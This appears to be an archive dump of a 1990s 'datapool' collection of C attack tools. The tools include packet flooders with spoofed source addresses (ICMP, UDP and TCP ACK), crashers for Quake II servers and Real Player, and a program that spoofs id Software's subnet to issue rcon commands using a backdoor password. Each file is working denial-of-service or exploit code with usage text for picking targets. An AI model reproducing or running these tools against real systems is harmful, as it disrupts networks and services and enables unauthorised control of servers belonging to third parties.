            "\tip->tot_len  = htons(pingsize + IPHDRSIZE + ICMPHDRSIZE + IPHDRSIZE + 8);",
            "        bcopy((char *)&destaddr.sin_addr, &ip->daddr, sizeof(ip->daddr));",
            "        bcopy((char *)&spoofaddr.sin_addr, &ip->saddr, sizeof(ip->saddr)); ",
            "\tip->check    = in_cksum(packet,IPHDRSIZE);",
            "\torigip->version  = 4;",
            "\torigip->ihl      = 5;",
            "\torigip->ttl      = ip->ttl - random()%15;",
            "\torigip->protocol = IPPROTO_TCP; ",
            "\torigip->tot_len  = IPHDRSIZE + 30; ",
            "\torigip->id       = random()%69;",
            "        bcopy((char *)&destaddr.sin_addr, &origip->saddr, sizeof(origip->saddr));",
            "       \torigip->check = in_cksum(origip,IPHDRSIZE);",
            "\t*((unsigned int *)data)          = htons(pingsize);",
            "\ticmp->type = 8; /* why should this be 3? */",
            "\ticmp->code = 0;",
            "\ticmp->checksum = in_cksum(icmp,pingsize+ICMPHDRSIZE+IPHDRSIZE+8);",
            "\treturn sendto(socket,packet,pingsize+IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE+8,0,",
            "\t\t      (struct sockaddr *)&destaddr,sizeof(struct sockaddr)); ",
            "     }",
            "void main(int argc, char *argv[])",
            "     {",
            "        int s, i;",
            "        int floodloop;",
            "        ",
            "\tif (parse_args(argc,argv)) ",
            "\t  {  ",
            "\t     usage(argv[0]); ",
            "\t     return;",
            "\t  }",
            "\tresolve_all(dest_name, spoof_name);",
            "\tgive_info();",
            "       \t",
            "       \ts = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "        if (!flood)",
            "\t  {",
            "\t     if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1)",
            "\t     {",
            "\t        printf(\"%s error sending packet\\n\",argv[0]); perror(\"\"); return;",
            "\t     }",
            "\t  }",
            "\telse",
            "\t  {",
            "             floodloop = 0;",
            "             if ( pingnmbr && (pingnmbr > 0) )",
            "             {",
            "               printf(\"sending... packet limit set\\n\");",
            "               for (i=0;i<pingnmbr;i++)",
            "\t       {",
            "\t\t if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) ",
            "\t         {",
            "\t\t    printf(\"%s error sending packet\\n\",argv[0]); perror(\"\"); return; ",
            "\t         }",
            "\t         if (!(floodloop = (floodloop+1)%25)) ",
            "\t\t  { fprintf(stdout,\".\"); fflush(stdout); ",
            "\t         }",
            " \t       }",
            "               printf(\"\\ncomplete, %u packets sent\\n\", pingnmbr);",
            "             }",
            "             else {",
            "               printf(\"flooding, (. == 25 packets)\\n\");",
            "               for (i=0;i<1;i)",
            "\t       {",
            "\t\t if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) ",
            "\t         {",
            "\t\t    printf(\"%s error sending packet\\n\",argv[0]); perror(\"\"); return; ",
            "\t         }",
            "\t         if (!(floodloop = (floodloop+1)%25)) ",
            "\t\t  { fprintf(stdout,\".\"); fflush(stdout); ",
            "\t         }",
            " \t       }",
            "             }",
            "\t  }",
            "     }",
            "datapool/src/quake2.c",
            "0100644",
            "0000000",
            "0000000",
            "00000010375",
            "07100656001",
            "013504",
            "ustar  ",
            "root",
            "root",
            "/* http://www.rootshell.com/ - 12/29/97 */",
            "  Remote denial of service for Quake II server's",
            "  Code by profound darkness <peedee@fuente.sventech.com>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <unistd.h>",
            "#include <sys/time.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <netinet/udp.h>",
            "#include <netinet/in_systm.h>",
            "FILE *hemroids;",
            "struct iphdr  *ip;",
            "struct udphdr *udp;",
            "struct sockaddr_in sinner;",
            "unsigned long destination;",
            "char *packet;",
            "int   flag;",
            "void usage(char *proggy) {",
            "  printf(\"\\nUsage: %s <option> <argument> <argument> <argument>\\n\\n\", proggy);",
            "  printf(\"   <option> : -s : Crash a single server, argument 1 is target host\\n\");",
            "  printf(\"   <option> : -m : Crash multiple servers, argument 1 becomes filename\\n\\n\");",
            "  printf(\" <argument> : Target host to crash or filename with multiple hostnames\\n\");",
            "  printf(\" <argument> : Port to send udp packets to for the crash, default is 27910\\n\");",
            "  printf(\" <argument> : Number of packets to send to the target host(s)\\n\\n\");",
            "  exit(0);",
            "char lookup(char *hostaddy) {",
            "  struct hostent *he;",
            "  he = gethostbyname(hostaddy);",
            "  if (he) {",
            "    memset(&sinner, 0, sizeof(struct sockaddr_in));",
            "    memcpy((caddr_t)&sinner.sin_addr.s_addr, he->h_addr, he->h_length);",
            "    sinner.sin_family = AF_INET;",
            "    sinner.sin_addr.s_addr = inet_addr(hostaddy);",
            "    sinner.sin_family = he->h_addrtype;",
            "  } else {",
            "    printf(\"\\\"%s\\\" is an unknown hostname.\\n\", hostaddy);",
            "    flag = 1;",
            "    return 0;",
            "  return ((unsigned long) he->h_addr);",
            "unsigned short in_cksum(addr, len)",
            "u_short *addr;",
            "int len;",
            "  register int lenny = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  while (lenny > 1) {",
            "    sum += *w++;",
            "    sum += *w++;",
            "    lenny -= 2;",
            "  if (lenny == 1) {",
            "    *(u_char *) (&answer) = *(u_char *) w;",
            "    sum += answer;",
            "  sum = (sum >> 17) + (sum & 0xffff);",
            "  sum += (sum >> 17);",
            "  answer = -sum;",
            "  return (answer);",
            "void buildpacket(char *monster, int dport, int sport, int numpacks) {",
            "  int sock, counter;",
            "  packet = (char *) malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + 1024);",
            "  ip = (struct iphdr *) packet;",
            "  udp = (struct udphdr *) (packet + sizeof(struct iphdr));",
            "  memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + 1024);",
            "  ip->saddr = lookup(\"127.0.0.1\");",
            "  ip->daddr = destination;",
            "  ip->version = 4;",
            "  ip->ihl = 5;",
            "  ip->ttl = 255;",
            "  ip->protocol = IPPROTO_UDP;",
            "  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 1024);",
            "  ip->check = in_cksum(ip, sizeof(struct iphdr));",
            "  udp->source = htons(sport);",
            "  udp->dest = htons(dport);",
            "  udp->len = htons(sizeof(struct udphdr) + 1024);",
            "  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  for(counter=0;counter!=numpacks;counter++) {",
            "    if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + 1024, 0, (struct sockaddr *) &sinner, sizeof(struct sockaddr_in)) == (-1)) {",
            "      perror(\"SendPacket\");",
            "      exit(0);",
            "    }",
            "char main(int argc, char *argv[]) {",
            "  int  count, sender;",
            "  char hostmask[100];",
            "  if (argc < 5) usage(argv[0]);",
            "  if (getuid()!=0) {",
            "    printf(\"This program requires root.\\n\");",
            "    exit(0);",
            "  while((count = getopt(argc, argv, \"s:m:\")) != -1) {",
            "    switch (count) {",
            "      case 's':",
            "        printf(\"Attempting to resolve %s.\\n\", argv[2]);",
            "        lookup(argv[2]);",
            "        if(flag == 1) break;",
            "        printf(\"Building %s packets & sending to %s:%s!\\n\", argv[4], argv[2], argv[3]);",
            "        buildpacket(argv[2], atoi(argv[3]), atoi(argv[3]), atoi(argv[4]));",
            "        break;",
            "      case 'm':",
            "        hemroids = fopen(argv[2], \"r\");",
            "        while(fgets(hostmask, sizeof(hostmask), hemroids)!=NULL) {",
            "          hostmask[strlen(hostmask)-1] = '\\0';",
            "          printf(\"Attempting to resolve %s.\\n\", hostmask);",
            "          lookup(hostmask);",
            "          if (flag == 1) goto doot;",
            "          printf(\"Building %s packets & sending to %s:%s!\\n\", argv[4], hostmask,argv[3]);",
            "          buildpacket(hostmask, atoi(argv[3]), atoi(argv[3]), atoi(argv[4]));",
            "          doot:",
            "          flag = 0;",
            "       }",
            "        break;",
            "      default:",
            "        usage(argv[0]);",
            "    }",
            "  if(flag != 1) {",
            "    printf(\"\\nThanks for using qcrash!\\n\");",
            "  fclose(hemroids);",
            "  exit(0);",
            "datapool/src/rape.c",
            "0100644",
            "0000000",
            "0000000",
            "00000003636",
            "07051164074",
            "013256",
            "ustar  ",
            "root",
            "root",
            "#define LAGG_STRING \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890^[];./\"",
            "#define LAGG_SIZE 300",
            "#define REGISTERED \"ViriiTek/bx user\"",
            "#define VERSION \"1.2.1\"",
            "#define DATE \"12.25.97\"",
            "#include <stdio.h>",
            "#include <sys/param.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <pwd.h>",
            "#include <arpa/inet.h>",
            "#include <signal.h>",
            "#include <netdb.h>",
            "#include <stdarg.h>",
            "int echo_connect(char *server, short port) {",
            "   struct sockaddr_in sin;",
            "   struct hostent *hp;",
            "   int thesock;",
            "   printf(\"\\nRape.C Version %s, By He||Angel and OseK\\n\", VERSION);",
            "   printf(\"Date Released: %s\\n\", DATE);",
            "   printf(\"Registered to: %s\\n\\n\", REGISTERED);",
            "   printf(\"Target: %s\\nPort: %d\\n\", server, port);",
            "   printf(\"Attacking Target... Press CTRL-C to exit.\\n\");",
            "   hp = gethostbyname(server);",
            "   if (hp == NULL) {",
            "      printf(\"Unknown Target: %s\\n\",server);",
            "      exit(0);",
            "   }",
            "   bzero((char*) &sin, sizeof(sin));",
            "   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);",
            "   sin.sin_family = hp->h_addrtype;\t",
            "   sin.sin_port = htons(port);",
            "   thesock = socket(AF_INET, SOCK_DGRAM, 0);",
            "   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));   ",
            "   return thesock;",
            "main(int argc, char **argv) {",
            "   int s, i;",
            "   if (argc != 4) {",
            "      printf(\"Usage: ./rape <target> <port> <times>\\n\");",
            "      printf(\"Best used on any open port.\\n\");",
            "      printf(\"Written by He||Angel and OseK\\n\");",
            "      printf(\"Modified for use with viriitek by Cyranix0r\\n\");",
            "      printf(\"Release Date: %s VERSION: %s\\n\", DATE, VERSION); ",
            "      exit(0);",
            "   }",
            "   s = echo_connect(argv[1], atoi(argv[2]));",
            "   for (i = 0; i < atoi(argv[3]); i++) {",
            "      send(s, LAGG_STRING, LAGG_SIZE, 0); ",
            "   }",
            "datapool/src/raped.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011734",
            "07066526330",
            "013423",
            "ustar  ",
            "root",
            "root",
            "  * raped.c by Liquid Steel [lst @ efnet -- yardley@uiuc.edu]",
            "  * src:         \tthis is the old hose.c by prym, modified to suit my purposes",
            "  * exploits:    \tthe stream.c \"problem\", not.. i did not have the stream.c ",
            "source when this was written",
            "  *              \tthis is just a reverse engineer based on discussion and ",
            "tcp patches released.",
            "  * compile:     \tthis is a 5 minute hack, and a 30 minute test prog, treat ",
            "it as such",
            "  *              \tside note, this is obviously only for linux due to the ",
            "header format.",
            "  */",
            "#include <signal.h>",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "int ports, s, i;",
            "char *dsthost;",
            "unsigned long dst;",
            "unsigned long portarray[255];",
            "void",
            "abort (void)",
            "   printf (\":: exiting...\\n\\n\");",
            "   close (s);",
            "   exit (0);",
            "void",
            "banner (void)",
            "   printf (\"-------------------\\n\");",
            "   printf (\"::\\n\");",
            "   printf (\":: raped.c by lst\\n\");",
            "   printf (\"::\\n\");",
            "   printf (\"-------------------\\n\");",
            "void",
            "usage (char *progname)",
            "   printf (\"usage: %s <dst> <ports>\\n\", progname);",
            "   printf (\"\\t<dst>   - destination host\\n\");",
            "   printf (\"\\t<ports> - ports to flood\\n\\n\");",
            "   exit (1);",
            "void",
            "parse_args (int argc, char *argv[])",
            "   dsthost = argv[1];",
            "   for (i = 2; i < argc; i++)",
            "     {",
            "       ports++;",
            "       portarray[ports] = atoi (argv[i]);",
            "     }",
            "unsigned long",
            "resolve_host (char *h)",
            "   struct hostent *host;",
            "   if ((host = gethostbyname (h)) == NULL)",
            "     {",
            "       printf (\":: unknown host %s\\n\", h);",
            "       exit (1);",
            "     }",
            "   return *(unsigned long *) host->h_addr;",
            "/* stolen from ping.c */",
            "unsigned short",
            "in_cksum (u_short * addr, int len)",
            "   register int nleft = len;",
            "   register u_short *w = addr;",
            "   register int sum = 0;",
            "   u_short answer = 0;",
            "   while (nleft > 1)",
            "     {",
            "       sum += *w++;",
            "       nleft -= 2;",
            "     }",
            "   if (nleft == 1)",
            "     {",
            "       *(u_char *) (&answer) = *(u_char *) w;",
            "       sum += answer;",
            "     }",
            "   sum = (sum >> 16) + (sum & 0xffff);",
            "   sum += (sum >> 16);",
            "   answer = ~sum;",
            "   return (answer);",
            "void",
            "send_tcp_segment (struct iphdr *ip, struct tcphdr *tcp, char *data, int dlen)",
            "   char buf[65536];",
            "   struct",
            "     {",
            "       unsigned long saddr;",
            "       unsigned long daddr;",
            "       char mbz;",
            "       char proto;",
            "       unsigned short tcplength;",
            "     }",
            "   ph;",
            "   struct sockaddr_in sin;",
            "   ph.saddr = ip->saddr;",
            "   ph.daddr = ip->daddr;",
            "   ph.mbz = 0;",
            "   ph.proto = IPPROTO_TCP;",
            "   ph.tcplength = htons (sizeof (*tcp) + dlen);",
            "   memcpy (buf, &ph, sizeof (ph));",
            "   memcpy (buf + sizeof (ph), tcp, sizeof (*tcp));",
            "   memcpy (buf + sizeof (ph) + sizeof (*tcp), data, dlen);",
            "   memset (buf + sizeof (ph) + sizeof (*tcp) + dlen, 0, 4);",
            "   tcp->check = in_cksum ((u_short *) buf, (sizeof (ph) + sizeof (*tcp) + ",
            "dlen + 1) & ~1);",
            "   memcpy (buf, ip, 4 * ip->ihl);",
            "   memcpy (buf + 4 * ip->ihl, tcp, sizeof (*tcp));",
            "   memcpy (buf + 4 * ip->ihl + sizeof (*tcp), data, dlen);",
            "   memset (buf + 4 * ip->ihl + sizeof (*tcp) + dlen, 0, 4);",
            "   ip->check = in_cksum ((u_short *) buf, (4 * ip->ihl + sizeof (*tcp) + ",
            "dlen + 1) & ~1);",
            "   memcpy (buf, ip, 4 * ip->ihl);",
            "   sin.sin_family = AF_INET;",
            "   sin.sin_port = tcp->dest;",
            "   sin.sin_addr.s_addr = ip->daddr;",
            "   if (sendto (s, buf, 4 * ip->ihl + sizeof (*tcp) + dlen, 0, &sin, sizeof ",
            "(sin)) < 0)",
            "     {",
            "       perror (\":: error: sending syn packet\");",
            "       exit (1);",
            "     }",
            "main (int argc, char *argv[])",
            "   struct iphdr ip;",
            "   struct tcphdr tcp;",
            "   struct timeval tv;",
            "   struct sockaddr_in sin;",
            "   int blah = 1;",
            "   signal (SIGINT, (void (*)()) abort);",
            "   banner ();",
            "   if (argc < 3)",
            "     usage (argv[0]);",
            "   parse_args (argc, argv);",
            "   dst = resolve_host (dsthost);",
            "   srand (time (NULL));",
            "   printf (\":: destination host - %s\\n\", dsthost);",
            "   printf (\":: destination port(s)\");",
            "   for (i = 1; i < ports + 1; i++)",
            "     printf (\" - %d\", portarray[i]);",
            "   printf (\"\\n\");",
            "   if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "     {",
            "       perror (\":: error: can not open socket\");",
            "       exit (1);",
            "     }",
            "   if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, (char *) &blah, sizeof ",
            "(blah)) < 0)",
            "     {",
            "       perror (\":: setsockopt\");",
            "       exit (1);",
            "     }",
            "   ip.version = 4;",
            "   ip.ihl = 5;",
            "   ip.tos = 0x8;",
            "   ip.frag_off = 0;",
            "   ip.ttl = 255;",
            "   ip.protocol = IPPROTO_TCP;",
            "   ip.check = 0;",
            "   ip.daddr = dst;",
            "   tcp.res1 = 0;",
            "   tcp.fin = 0;",
            "   tcp.syn = 0;",
            "   tcp.rst = 0;",
            "   tcp.psh = 0;",
            "   /* make it an ACK packet */",
            "   tcp.ack = 1;",
            "   tcp.urg = 0;",
            "   tcp.res2 = 0;",
            "   tcp.urg_ptr = 0;",
            "   printf (\":: raping...\\n\");",
            "   printf (\":: press ^C to end...\\n\");",
            "   for (;;)",
            "     {",
            "       for (i = 1; i < ports + 1; i++)",
            "\t  ip.saddr = rand ();",
            "\t  ip.tot_len = sizeof (ip) + sizeof (tcp);",
            "\t  ip.id = htons (random ());",
            "\t  tcp.source = htons (1024 + rand () % 32000);",
            "\t  tcp.dest = htons (portarray[i]);",
            "\t  /* randomize seq */",
            "\t  tcp.seq = random ();",
            "\t  tcp.doff = sizeof (tcp) / 4;",
            "\t  tcp.window = htons (16384);",
            "\t  /* randomize ack */",
            "\t  tcp.ack_seq = random ();",
            "\t  send_tcp_segment (&ip, &tcp, \"\", 0);",
            "     }",
            "   return 1;",
            "datapool/src/rc8.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004533",
            "06633371674",
            "013033",
            "ustar  ",
            "root",
            "root",
            "/* Rythem Collision UDP flooder. [v0.8]",
            "   this code was taken bit by bit most of it is mine but i need help where",
            "   i could get it. (wish i knew who made the original source =/).",
            "   usage: rc <from host> <to host> <how many>",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in_systm.h>",
            "#include<netinet/in.h>",
            "#include<netinet/ip.h>",
            "#include<netinet/udp.h>",
            "#include<errno.h>",
            "#include<string.h>",
            "#include<netdb.h>",
            "#include<arpa/inet.h>",
            "#include<stdio.h>",
            "#define VERSION_S \"0.8\"",
            "struct sockaddr sa;",
            "main(int argc,char **argv)",
            "int fd;",
            "int x=1;",
            "struct sockaddr_in *p;",
            "struct hostent *he;",
            "int numpackets;",
            "u_char gram[38]=",
            "        {",
            "        0x45,   0x00,   0x00,   0x26,",
            "        0x12,   0x34,   0x00,   0x00,",
            "        0xFF,   0x11,   0,      0,",
            "        0,      0,      0,      0,",
            "        0,      0,      0,      0,",
            "        0,      0,      0,      0,",
            "        0x00,   0x12,   0x00,   0x00,",
            "        '1','2','3','4','5','6','7','8','9','0'",
            "        };",
            "fprintf(stderr, \"Rythem Collision [v%s] -- Coded, Nso\\n\", VERSION_S);",
            "if(argc!=4)",
            "        {",
            "        fprintf(stderr,\"usage: rc <from host> <to host> <how many>\\n\");",
            "        exit(1);",
            "        };",
            "numpackets = atoi(argv[3]);",
            "if((he=gethostbyname(argv[1]))==NULL)",
            "        {",
            "        fprintf(stderr,\"The source hostname _must_ be real.\\n\");",
            "        exit(1);",
            "        };",
            "bcopy(*(he->h_addr_list),(gram+12),4);",
            "if((he=gethostbyname(argv[2]))==NULL)",
            "        {",
            "        fprintf(stderr,\"The destination hostname does not exist.n\");",
            "        exit(1);",
            "        };",
            "bcopy(*(he->h_addr_list),(gram+16),4);",
            "*(u_short*)(gram+20)=htons((u_short)7);",
            "*(u_short*)(gram+22)=htons((u_short)7);",
            "p=(struct sockaddr_in*)&sa;",
            "p->sin_family=AF_INET;",
            "bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));",
            "if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)",
            "        {",
            "        perror(\"socket\");",
            "        exit(1);",
            "        };",
            "#ifdef IP_HDRINCL",
            "fprintf(stderr,\"IP_HDRINCL: found!\\n\");",
            "if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "        {",
            "        perror(\"setsockopt IP_HDRINCL\");",
            "        exit(1);",
            "        };",
            "#else",
            "fprintf(stderr,\"IP_HDRINCL: not found.\\n\");",
            "#endif",
            "for(x=0;x<numpackets;x++)",
            " if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)",
            "        {",
            "        perror(\"sendto\");",
            "        exit(1);",
            "        };",
            "  printf(\".\"); ",
            "  fflush(stdout);",
            "printf(\"\\nnumber of packets sent: %d\\n\", x);",
            "datapool/src/rcon.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005027",
            "06641217101",
            "013256",
            "ustar  ",
            "root",
            "root",
            "/* rcon.c",
            "  Quake  world rcon_password bug implimentation by Jeff Roberson, <jroberson@chesapeake.net> (VallaH)",
            "  Linux 2.0.33 source, will compile on BSD if you modify the ip header etc.",
            "  Please note that I did not discover this, I simply wrote the code.",
            "  Thanks to Nick Toomey, <ntoomey@chesapeake.net> (Grifter)",
            "  Brief summary:",
            "      Any rcon command coming from the idsoftware subnet 192.246.40 with the rcon password of tms will be accepted on any server.  This program simply spoofs a packet from vader.idsoftware.com (random pick) to whatever server you identify.",
            "  Usage:",
            "\t./rcon ip/host \"what you want to do\" [port]",
            "  Example:",
            "\t./rcon quake.idsoftware.com \"say This program works, thanks Jeff\" 27500",
            "         the port argument is optional, you may omit it if you like and it will default to 27500.",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>                                                ",
            "#define SIP \"192.246.40.42\" /* vader.idsoftware.com */",
            "#define command \"rcon tms \"",
            "u_long resolve_address(u_char *host)",
            "\tstruct\tin_addr\taddr;",
            "\tstruct\thostent\t*he;",
            "\tif((addr.s_addr = inet_addr(host)) == -1) {",
            "\t\tif (!(he = gethostbyname(host))) {",
            "\t\t\tprintf(\"Unknown address: %s\\n\", host); ",
            "\t\t\texit(-1);",
            "\t\tbcopy(he->h_addr, (char *)&addr.s_addr, he->h_length);",
            "\treturn(addr.s_addr);",
            "int main(int argc, char **argv)",
            "\tint\ts;",
            "\tint\tport=27500;",
            "\tchar\tbuf[512];",
            "\tstruct\tsockaddr_in dst;",
            "\tstruct\tiphdr *iph=(struct iphdr *)buf;",
            "\tstruct\tudphdr *udp=(struct udphdr *)(buf + 20);",
            "\tif (argc<3) {",
            "\t\tprintf(\"usage:\\n\");",
            "\t\tprintf(\"\\t%s ip \"\"command\"\" <port>\\n\", argv[0]);",
            "\t\texit(-1);\t\t",
            "\tif (argc==4) port = atoi(argv[3]);",
            "\tbzero(buf, sizeof(buf));",
            "\tbzero((char *)&dst, sizeof(dst));",
            "\tiph->version=4;",
            "\tiph->ihl=5;",
            "\tiph->tos=0;",
            "\tiph->tot_len=htons(sizeof(buf));",
            "\tiph->id=htons(1234);",
            "\tiph->frag_off=0;",
            "\tiph->ttl=255;",
            "\tiph->protocol=17;",
            "\tiph->saddr=inet_addr(SIP);",
            "\tiph->daddr=resolve_address(argv[1]);",
            "\tudp->source=htons(1234);",
            "\tudp->dest=htons(port);",
            "\tudp->len=htons(sizeof(buf) - 20);",
            "\tdst.sin_family=PF_INET;",
            "\tdst.sin_addr.s_addr=iph->daddr;",
            "\tdst.sin_port=htons(27500);",
            "\tsprintf((buf + 28), \"%s%s\\n\", command, argv[2]); ",
            "\tif ((s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "\t\tperror(\"socket\");",
            "\t\texit(-1);",
            "\tif ((sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst))) <=0) {",
            "\t\tperror(\"sendto\");",
            "\t\texit(-1);",
            "\texit(1);",
            "datapool/src/rpk.c",
            "0100644",
            "0000000",
            "0000000",
            "00000010066",
            "07077666002",
            "013124",
            "ustar  ",
            "root",
            "root",
            " * Real Player Killer - 6/26/98",
            " * (C) 1998 Kit Knox <kit@connectnet.com>",
            " * [ http://www.rootshell.com/ ]",
            " * Real Player 5.0 for Windows95 and Linux (others untested) do not check",
            " * the validity of incoming UDP packets used when receiving audio/video.",
            " * If you are able to determine or brute force the destination port of the",
            " * stream you are able to crash the player and cause it to use 100% of",
            " * idle CPU.  I would not be surprised if there are numerous buffer",
            " * overflows in this area as well.  The client does not even check if the",
            " * source IP address is the one it is receiving data from.  Any source IP",
            " * can be used.",
            " * Generally the stack will start with port 1025 and go up.  Starting there",
            " * and going up will generally give you good results.  If you are able to",
            " * sniff the network you will know the exact port and not have to guess.",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "#include <netdb.h>",
            "#define err(x) { fprintf(stderr, x); exit(1); }",
            "#define errs(x, y) { fprintf(stderr, x, y); exit(1); }",
            "char real_data[] =",
            "  { 0x00, 0x00 };",
            "unsigned short ",
            "in_cksum (addr, len)",
            "     u_short *addr;",
            "     int len;",
            "  register int nleft = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  sum = (sum >> 16) + (sum & 0xffff);",
            "  sum += (sum >> 16);",
            "  answer = ~sum;",
            "  return (answer);",
            "int ",
            "sendpkt_udp (sin, s, data, datalen, saddr, daddr, sport, dport)",
            "     struct sockaddr_in *sin;",
            "     unsigned short int s, datalen, sport, dport;",
            "     unsigned long int saddr, daddr;",
            "     char *data;",
            "  struct iphdr ip;",
            "  struct udphdr udp;",
            "  static char packet[8192];",
            "  char crashme[500];",
            "  int i;",
            "  ip.ihl = 5;",
            "  ip.version = 4;",
            "  ip.tos = rand () % 100;;",
            "  ip.tot_len = htons (28 + datalen);",
            "  ip.id = htons (31337 + (rand () % 100));",
            "  ip.frag_off = 0;",
            "  ip.ttl = 255;",
            "  ip.protocol = IPPROTO_UDP;",
            "  ip.check = 0;",
            "  ip.saddr = saddr;",
            "  ip.daddr = daddr;",
            "  ip.check = in_cksum ((char *) &ip, sizeof (ip));",
            "  udp.source = htons (sport);",
            "  udp.dest = htons (dport);",
            "  udp.len = htons (8 + datalen);",
            "  udp.check = (short) 0;",
            "  memcpy (packet, (char *) &ip, sizeof (ip));",
            "  memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));",
            "  memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, datalen);",
            "  for (i = 0; i < 500; i++)",
            "    crashme[i] = rand () % 255;",
            "  memcpy (packet + sizeof (ip) + sizeof (udp) + datalen, crashme, 500);",
            "  return (sendto (s, packet, sizeof (ip) + sizeof (udp) + datalen + 500, 0,",
            "\t\t  (struct sockaddr *) sin, sizeof (struct sockaddr_in)));",
            "unsigned int ",
            "lookup (host)",
            "     char *host;",
            "  unsigned int addr;",
            "  struct hostent *he;",
            "  addr = inet_addr (host);",
            "  if (addr == -1)",
            "    {",
            "      he = gethostbyname (host);",
            "      if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))",
            "\treturn 0;",
            "      bcopy (*(he->h_addr_list), &(addr), sizeof (he->h_addr_list));",
            "    }",
            "  return (addr);",
            "void",
            "main (argc, argv)",
            "     int argc;",
            "     char **argv;",
            "  unsigned int saddr, daddr;",
            "  struct sockaddr_in sin;",
            "  int s, i;",
            "  if (argc != 5)",
            "    errs (\"Usage: %s <source_addr> <dest_addr> <low port> <high port>\\n\", argv[0]);",
            "  printf(\"Real Player Killer - http://www.rootshell.com/\\n\\n\");",
            "  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)",
            "    err (\"Unable to open raw socket.\\n\");",
            "  if (!(saddr = lookup (argv[1])))",
            "    err (\"Unable to lookup source address.\\n\");",
            "  if (!(daddr = lookup (argv[2])))",
            "    err (\"Unable to lookup destination address.\\n\");",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = 9;",
            "  sin.sin_addr.s_addr = daddr;",
            "  for (i=atoi(argv[3]); i<atoi(argv[4]); i++)",
            "  if ((sendpkt_udp (&sin, s, &real_data, sizeof (real_data), saddr, daddr, 2014, i)) == -1)",
            "    {",
            "      perror (\"sendpkt_udp\");",
            "      err (\"Error sending the UDP packet.\\n\");",
            "    }",
            "  printf(\"Done!\\n\");",
            "datapool/src/rwhokill.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007046",
            "07077667637",
            "014206",
            "ustar  ",
            "root",
            "root",
            " *  filename:  rwhokill.c",
            " *  author:    sygma @undernet",
            " *  problem:   rwhod uses UDP packtes to pick up whos on a network,",
            " *             and creates a spool file based upon the packets received.",
            " *\t       You could create mad spool files.. ",
            " *  fix:       Don't run rwhod :)",
            " *  notes:     I won't be held reponsible for the missuse most people do",
            " *             with this stuff.  It's for educational purposes only!",
            " *  tested on: Linux [slackware]",
            " *             FreeBSD 2.2.5-Stable    FreeBSD 2.2.6-BETA [aparently patched]",
            " *             NetBSD 1.2",
            " *  greets:    B - lub you too :P, saad[too bad you're in if you like it ",
            " *\t       or not], humble, and special thanks to my daddy - tiepilot ",
            " *\t       DaveRT - you da man, n`tropy - who taught me absolutely",
            " *\t       nothing at all, and anyone in snickers and",
            " *\t       innuendo :) - and I can't forget Vallah [who I ripped packets",
            " *\t       from :)]\t                                     `_@__",
            "#include <stdio.h> ",
            "#include <stdlib.h> ",
            "#include <errno.h> ",
            "#include <string.h> ",
